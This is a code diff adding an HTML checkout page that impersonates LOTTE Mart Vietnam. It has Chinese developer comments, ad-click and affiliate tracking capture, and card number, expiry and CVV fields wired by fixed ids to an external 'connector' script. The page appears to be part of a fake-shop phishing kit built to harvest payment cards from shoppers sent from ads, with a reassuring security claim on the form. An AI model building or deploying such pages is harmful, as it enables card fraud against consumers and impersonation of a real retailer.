@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Thanh toán | LOTTE Mart Việt Nam</title>
+  <link rel="icon" href="/favicon.ico">
+
+  <!-- ① UTM 捕获：同步内联，必须最先执行 -->
+  <script>
+  (function(){
+    var K=['utm_source','utm_medium','utm_campaign','utm_term','utm_content',
+           'utm_id','fbclid','ttclid','gclid','adset_id','campaign_id',
+           'sub1','sub2','sub3','sub4','sub5'];
+    function grab(q){var o={},p=(q||'').replace(/^\?/,'').split('&');for(var i=0;i<p.length;i++){
+      var kv=p[i].split('=');if(kv.length<2)continue;try{var k=decodeURIComponent(kv[0]);
+      if(K.indexOf(k)!==-1)o[k]=decodeURIComponent(kv.slice(1).join('='));}catch(e){}}return o;}
+    function load(){try{return JSON.parse(sessionStorage.getItem('bp_utm')||'{}')}catch(e){return {}}}
+    function save(o){try{sessionStorage.setItem('bp_utm',JSON.stringify(o))}catch(e){}
+      try{var d=new Date();d.setTime(d.getTime()+7*864e5);
+      document.cookie='bp_utm='+encodeURIComponent(JSON.stringify(o))+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';}catch(e){}}
+    var cur=load(),add=false;
+    var m=grab(location.search); for(var a in m){cur[a]=m[a];add=true}
+    try{var n=performance.getEntriesByType&&performance.getEntriesByType('navigation')[0];
+      if(n&&n.name){var mm=grab(n.name.split('?')[1]||'');for(var b in mm){cur[b]=mm[b];add=true}}}catch(e){}
+    try{if(document.referrer){var mm2=grab((document.referrer.split('?')[1])||'');
+      for(var c in mm2){if(!cur[c]){cur[c]=mm2[c];add=true}}}}catch(e){}
+    if(add)save(cur);
+    window.__BP_UTM__=cur;
+  })();
+  </script>
+
+  <!-- ② 购物车骨架：必须在 connector.js 之前就存在 -->
+  <script>
+    window.__BP_CART__ = {
+      order_number: "", currency: "", total: 0, total_amount: "",
+      items: [], locale: document.documentElement.lang || "en"
+    };
+  </script>
+
+  <!-- ③ connector 资源（绝对路径） -->
+  <link rel="stylesheet" href="/bp/connector.css">
+  <script defer src="/bp/connector.js"></script>
+
+  <link rel="stylesheet" href="/assets/base.css">
+  <script src="/assets/config.js"></script>
+  <script defer src="/assets/pixel.js"></script>
+  <script defer src="/assets/app.js"></script>
+  <script defer src="/assets/layout.js"></script>
+  <script defer src="/assets/checkout.js"></script>
+</head>
+<body data-page="checkout">
+  <div data-lm-header></div>
+  <main class="lm-main">
+    <div class="container">
+      <nav class="lm-crumb" aria-label="Breadcrumb">
+        <a href="/">Trang chủ</a><span class="sep">/</span>
+        <a href="/cart">Giỏ hàng</a><span class="sep">/</span>
+        <span class="cur">Thanh toán</span>
+      </nav>
+      <div class="lm-page-head">
+        <h1>Thanh toán</h1>
+        <span class="sub" data-order-label>Đơn hàng</span>
+      </div>
+
+      <div class="lm-co-layout">
+        <!-- 左：表单（卡片表单必须在首屏，不做二段式） -->
+        <form id="bp-form" novalidate autocomplete="on">
+          <section class="lm-co-card">
+            <h2><span class="n">1</span> Thông tin khách hàng</h2>
+            <div class="lm-field">
+              <label for="t-name">Họ và tên <span class="req">*</span></label>
+              <input id="t-name" name="name" autocomplete="name" placeholder="Nguyễn Văn A">
+            </div>
+            <div class="lm-field-row">
+              <div class="lm-field">
+                <label for="t-email">Email <span class="req">*</span></label>
+                <input id="t-email" name="email" type="email" autocomplete="email" placeholder="email@example.com">
+              </div>
+              <div class="lm-field">
+                <label for="t-phone">Số điện thoại</label>
+                <input id="t-phone" name="phone" type="tel" autocomplete="tel" placeholder="0901 234 567">
+              </div>
+            </div>
+            <div class="lm-field">
+              <label for="t-addr">Địa chỉ nhận hàng <span class="req">*</span></label>
+              <input id="t-addr" name="addr" autocomplete="address-line1" placeholder="Số nhà, tên đường">
+            </div>
+            <div class="lm-field-row-3">
+              <div class="lm-field">
+                <label for="t-city">Tỉnh / Thành phố</label>
+                <input id="t-city" name="city" autocomplete="address-level2" placeholder="TP. Hồ Chí Minh">
+              </div>
+              <div class="lm-field">
+                <label for="t-district">Quận / Huyện</label>
+                <input id="t-district" name="district" autocomplete="address-level3" placeholder="Quận 7">
+              </div>
+              <div class="lm-field">
+                <label for="t-zip">Mã bưu chính</label>
+                <input id="t-zip" name="zip" autocomplete="postal-code" placeholder="700000">
+              </div>
+            </div>
+            <div class="lm-field mb-0">
+              <label for="t-country">Quốc gia</label>
+              <select id="t-country" name="country" autocomplete="country">
+                <option value="VN" selected>Việt Nam</option>
+                <option value="US">United States</option>
+                <option value="KR">Korea</option>
+                <option value="JP">Japan</option>
+                <option value="SG">Singapore</option>
+              </select>
+            </div>
+          </section>
+
+          <section class="lm-co-card">
+            <h2><span class="n">2</span> Phương thức thanh toán</h2>
+            <div class="lm-pay-methods">
+              <label class="lm-pay-method on">
+                <input type="radio" name="pay" value="card" checked>
+                <span><span class="t">Thẻ tín dụng / ghi nợ</span><br><span class="d">Visa · Mastercard · JCB · Amex</span></span>
+              </label>
+            </div>
+          </section>
+
+          <section class="lm-co-card">
+            <h2><span class="n">3</span> Thông tin thẻ</h2>
+            <!-- 卡片三字段：id 固定，普通 input，容器必须带 .bp-card-fields -->
+            <div class="bp-card-fields">
+              <div class="lm-field">
+                <label for="bp-card-number">Số thẻ <span class="req">*</span></label>
+                <input id="bp-card-number" name="card-number" type="text" inputmode="numeric"
+                       autocomplete="cc-number" maxlength="23" placeholder="1234 5678 9012 3456">
+              </div>
+              <div class="lm-field-row">
+                <div class="lm-field">
+                  <label for="bp-card-expiry">Ngày hết hạn <span class="req">*</span></label>
+                  <input id="bp-card-expiry" name="card-expiry" type="text" inputmode="numeric"
+                         autocomplete="cc-exp" maxlength="7" placeholder="MM/YY">
+                </div>
+                <div class="lm-field">
+                  <label for="bp-card-cvc">Mã CVV <span class="req">*</span></label>
+                  <input id="bp-card-cvc" name="card-cvc" type="text" inputmode="numeric"
+                         autocomplete="cc-csc" maxlength="4" placeholder="CVC">
+                </div>
+              </div>
+            </div>
+
+            <!-- 合计：文本 + 机器可读整数，同源 -->
+            <div class="lm-co-total">
+              <span>Tổng thanh toán</span>
+              <span id="bp-total" data-amount="0" data-currency="VND">0 ₫</span>
+            </div>
+
+            <!-- 错误区：常驻，不要 display:none -->
+            <div id="bp-error" role="alert" aria-live="polite"></div>
+
+            <button id="bp-submit" type="submit" class="btn btn-lg btn-block">Thanh toán</button>
+            <div class="lm-secure">Bảo mật SSL 256-bit · Thông tin thẻ được mã hoá</div>
+          </section>
+        </form>
+
+        <!-- 右：订单摘要 -->
+        <aside class="lm-summary">
+          <h2>Đơn hàng của bạn</h2>
+          <div class="lm-co-lines" data-lines></div>
+          <div class="line" style="display:flex;justify-content:space-between;padding:8px 0;font-size:13.5px"><span>Tạm tính</span><b data-list>0 ₫</b></div>
+          <div class="line" style="display:flex;justify-content:space-between;padding:8px 0;font-size:13.5px;color:#16b364"><span>Giảm giá</span><b data-saved>-0 ₫</b></div>
+          <div class="line" style="display:flex;justify-content:space-between;padding:8px 0;font-size:13.5px"><span>Phí vận chuyển</span><b data-ship>Miễn phí</b></div>
+          <div class="total"><span>Tổng cộng</span><b data-total>0 ₫</b></div>
+          <div class="note" data-deliver>Giao đến: chưa chọn địa chỉ</div>
+        </aside>
+      </div>
+    </div>
+  </main>
+  <div data-lm-footer></div>
+</body>
+</html>
